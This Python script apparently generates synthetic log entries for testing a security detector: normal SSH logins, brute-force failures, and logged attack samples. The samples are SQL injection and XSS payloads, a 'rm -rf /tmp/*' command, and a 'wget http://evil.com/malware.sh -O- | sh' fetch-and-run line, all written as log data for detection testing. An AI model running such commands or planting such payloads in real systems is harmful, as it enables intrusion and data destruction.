#!/usr/bin/env python3
import random
from datetime import datetime, timedelta

def generate_test_log(filename="test_log.log", num_entries=50):
    """Generate a test log file with various security events"""
    base_time = datetime.now()
    ips = ["192.168.1.{}".format(i) for i in range(1, 20)]
    users = ["root", "admin", "user", "guest", "test"]
    
    with open(filename, "w") as f:
        # Generate normal entries
        for i in range(num_entries // 2):
            log_time = base_time + timedelta(seconds=random.randint(1, 300))
            ip = random.choice(ips)
            user = random.choice(users)
            f.write(f"{log_time.strftime('%b %d %H:%M:%S')} server sshd[1234]: Accepted password for {user} from {ip} port 22\n")
        
        # Generate brute force attacks
        attacker_ip = "192.168.1.100"
        for i in range(1, 6):  # 5 failed attempts
            log_time = base_time + timedelta(seconds=i*10)
            user = random.choice(["root", "admin"])
            f.write(f"{log_time.strftime('%b %d %H:%M:%S')} server sshd[1234]: Failed password for {user} from {attacker_ip} port 22\n")
        
        # Generate SQL injection attempts
        sql_attempts = [
            "GET /search.php?q=' UNION SELECT password FROM users--",
            "GET /login.php?user=admin'--",
            "POST /submit.php?data=' OR 1=1--"
        ]
        for attempt in sql_attempts:
            log_time = base_time + timedelta(seconds=random.randint(200, 300))
            ip = random.choice(ips)
            f.write(f"{log_time.strftime('%b %d %H:%M:%S')} server httpd[2000]: {attempt}\n")
        
        # Generate XSS attempts
        xss_attempts = [
            "GET /profile.php?name=<script>alert(1)</script>",
            "POST /comment.php?text=<img src=x onerror=alert(1)>"
        ]
        for attempt in xss_attempts:
            log_time = base_time + timedelta(seconds=random.randint(200, 300))
            ip = random.choice(ips)
            f.write(f"{log_time.strftime('%b %d %H:%M:%S')} server httpd[2000]: {attempt}\n")
        
        # Generate malicious commands
        malicious_cmds = [
            "user=root; command='rm -rf /tmp/*'",
            "user=admin; command='wget http://evil.com/malware.sh -O- | sh'"
        ]
        for cmd in malicious_cmds:
            log_time = base_time + timedelta(seconds=random.randint(200, 300))
            ip = random.choice(ips)
            f.write(f"{log_time.strftime('%b %d %H:%M:%S')} server bash[3000]: {cmd}\n")

if __name__ == "__main__":
    generate_test_log()
    print("Generated test_log.log with:")
    print("- 25 normal login entries")
    print("- 5 failed login attempts from 192.168.1.100 (should trigger brute force detection)")
    print("- 3 SQL injection attempts")
    print("- 2 XSS attempts")
    print("- 2 malicious command executions")